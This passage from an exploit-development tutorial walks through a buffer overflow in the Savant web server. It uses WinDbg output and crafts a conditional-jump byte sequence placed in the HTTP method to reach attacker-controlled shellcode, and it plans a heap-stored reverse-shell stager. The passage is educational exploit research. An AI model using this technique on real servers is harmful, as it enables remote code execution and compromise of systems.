</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0000000</span>e edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77732</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000202</span>
</span></span><span style="display:flex;"><span>Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18674</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0481f</span>e60 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0000000</span>e edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77732</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8675</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea20 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000202</span>
</span></span><span style="display:flex;"><span>Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18675</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8675</span> c3              ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea20  <span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea74
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea24  <span style="color:#ae81ff">0041703</span>c Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1703c</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds <span style="color:#a6e22e">poi</span>(esp)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea74  <span style="color:#ae81ff">00544547</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea78  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea7c  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea80  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea84  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea88  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea8c  <span style="color:#ae81ff">4141412f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea90  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea94  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea98  <span style="color:#ae81ff">41414141</span>
</span></span></code></pre></div><p>We can see that now we are landing on the address that we want.
Because we made sure that EAX would contain a valid memory address, we should be able to execute these instructions without generating an access violation, until we reach our buffer of 0x41 characters.
While this solution works, executing assembly instructions generated by the opcodes of our HTTP method <strong>is not very clean.</strong> Let’s explore some other options in the hopes of finding a more elegant way of reaching the start of our 0x41 buffer.</p>
<p>First, let&rsquo;s think that we are sending the GET method in our request, as well as the route, and such values are the ones being interpreted when the pop, ret instruction occurs.
What if we change the HTTP method used and insert some bytes? If instruction bytes can be inserted, when performing the jump, it would jump to our controlled instruction. We could insert a short jump instruction instead of GET in order to jump directly to our payload.
Let&rsquo;s try to modify the method used and insert some &ldquo;C&rdquo; characters as the method. They get reflected:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18674</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dc <span style="color:#a6e22e">poi</span>(esp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea74  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>  CCCCCCCC........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea84  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">4141412f</span> <span style="color:#ae81ff">41414141</span>  ........<span style="color:#f92672">/</span>AAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea94  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eaa4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eab4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eac4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ead4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eae4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>Now, we want to replace our &ldquo;C&quot;s for a short jump instruction. Let&rsquo;s see how much bytes do we have to jump:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> db <span style="color:#a6e22e">poi</span>(esp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea74  <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  CCCCCCCC........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea84  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  ........<span style="color:#f92672">/</span>AAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea94  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eaa4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eab4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eac4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ead4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eae4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>Now let&rsquo;s put a breakpoint on TBD and perform the short jump operation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> a eip
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea74 jmp <span style="color:#ae81ff">0x0478ea8d</span> 
</span></span><span style="display:flex;"><span>jmp <span style="color:#ae81ff">0x0478ea8d</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea76 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> u eip
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea74 eb17            jmp     <span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea8d
</span></span></code></pre></div><p>We would have to add eb17 as the HTTP method.
However, when inserting it, we see that the &ldquo;eb&rdquo; bytes are replaced for &ldquo;cb&rdquo;, meaning that such character has been mangled:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0475</span>ea74 cb              retf
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0475</span>ea75 <span style="color:#ae81ff">17</span>              pop     ss
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0475</span>ea76 <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0475</span>ea78 <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span></code></pre></div><p>Given that this memory is most likely allocated separately from the allocation storing the rest of the buffer, <strong>it is possible that different operations are done that cause our byte to get mangled.</strong> Therefore, take note as you might find different memory allocations with different checks and operations performed on the data stored in them, and you have to find a different set of bad characters for such section.
For now, let&rsquo;s assume that we can&rsquo;t use a short jump operation.
We need another solution. We could maybe use the island hopping technique, modifying the ESP to point to our buffer and jump to it.
However, we are going to see other alternative. Let&rsquo;s see <strong>conditional jumps.</strong>
Conditional jumps are a jump operation that only is executed is specific conditions are done. This process occurs in two steps.
The first step is a test on the condition, and the second step is a jump depending on the condition.
Note: There are a number of conditional jumps in the assembly language that depend on registry values, FLAG registers, and comparisons between signed or unsigned operands.
While we do have a limited memory space that is allocated for the HTTP method, it should still be more than enough for us to set up a condition followed by a jump for that condition.
<strong>We will use the JE (Jump if Equal) condition. This instruction will execute a short jump and the condition from the jump is based on the value of the ZF (Zero Flag) register. More specifically, the jump is taken if the value of the ZF register is 1 (TRUE).</strong>
Note: The Zero Flag register is a single bit flag that is used on most architectures. On x86/x64, it is stored in a dedicated register called ZF. This flag is used to check the result of arithmetic operations. It is set to 1 (TRUE) if the result of an arithmetic operation is zero and otherwise set to 0 (FALSE).</p>
<p>In order to jump, we need to set the value of the ZF to 1 so that the condition is true.
To archieve that, we will use a XOR operation between a register as destination and as source. Any register is valid, as long as the instruction does not contain badchars. <strong>Doing a XOR with the same destination and source sets the register to 0, nulling the register</strong>.
After the XOR, we will do a TEST instruction with the same register as both operands. As the result is 0, the ZF results to be 1.
Then we can perform the JE o JZ (they both check if ZF is set to 1).
Let&rsquo;s craft these operations (we will use ECX as the dummy register for the XOR and TEST operations):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> xor ecx, ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">31</span>C9              xor ecx,ecx
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> test ecx, ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">85</span>C9              test ecx,ecx
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> je <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">0F</span><span style="color:#ae81ff">8411000000</span>      jz near <span style="color:#ae81ff">0x17</span>
</span></span></code></pre></div><p>The last instruction contains three null bytes. This is problematic but remember that the rest of the space between the HTTP method and the slash and our payload is full of zeros. We can skip from sending these null bytes as they will be already stored in such place by the application:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>httpMethod <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xC9\x85\xC9\x0F\x84\x11</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; /&#34;</span>  <span style="color:#75715e"># xor ecx, ecx; test ecx, ecx; je 0x17</span>
</span></span></code></pre></div><p>If we send this and analyze the code, now the instructions are not mangled and that it is a clean jump to our shellcode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea74 <span style="color:#ae81ff">31</span>c9            xor     ecx,ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea76 <span style="color:#ae81ff">85</span>c9            test    ecx,ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea78 <span style="color:#ae81ff">0f</span><span style="color:#ae81ff">8411000000</span>    je      <span style="color:#ae81ff">046</span>bea8f
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">046</span>bea8f
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea8f <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea90 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea91 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea92 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea93 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea94 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea95 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span></code></pre></div><p>Let&rsquo;s see the ZF value after the XOR and TEST operations:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> r zf
</span></span><span style="display:flex;"><span>zf<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bfe60 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">822</span>bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>ea2da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">822</span>bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bea78 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bea24 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea78 <span style="color:#ae81ff">0f</span><span style="color:#ae81ff">8411000000</span>    je      <span style="color:#ae81ff">046</span>bea8f                                [br<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bfe60 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">822</span>bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>ea2da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">822</span>bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bea8f esp<span style="color:#f92672">=</span><span style="color:#ae81ff">046</span>bea24 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea8f <span style="color:#ae81ff">41</span>              inc     ecx
</span></span></code></pre></div><p>We successfully landed on our code, but if we see closely, we land on a 2 byte offset:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dd <span style="color:#ae81ff">046</span>bea8f<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea8b  <span style="color:#ae81ff">41412f</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>
</span></span></code></pre></div><p>This is not a problem as we can fix the offset, or add some NOPs before our shellcode in case that the offset is not consistent.
Once we know how to execute our code, the next step is to see if we have enough space.</p>
<p>After calculating how many &ldquo;A&quot;s does the buffer store, we see that the result is 251 bytes.
While generating a reverse shell payload in previous modules, the size of the resulting shellcode was over 300 bytes. A more advanced payload, such as a Meterpreter, would require even more space.
Even if we were to use the HTTP method buffer, rather than jumping over it, we would still not have enough space for a large payload.</p>
<p>Therefore, we have to find a way to store a larger shellcode in our current exploit.</p>
<h1 id="storing-the-shellcode-in-the-heap">Storing the shellcode in the heap</h1>
<p>We have to find a way to store the shellcode in other place of the application. Another option is to use a smaller payloads with fewer features, but this is a last resort.
We have to store our shellcode in a different memory region before the crash and then redirect the execution flow to that additional buffer. We will use the space we already have to create a &ldquo;stager&rdquo; shellcode that jumps to this second memory region, once we find it.
To determine what will be stored in memory by our vulnerable application, we could either perform a very in-depth reverse engineering process on the application, or we could make some educated guesses based on the type of application we are attacking.
In the case of this application, a web server, we could do two things:</p>
<ul>
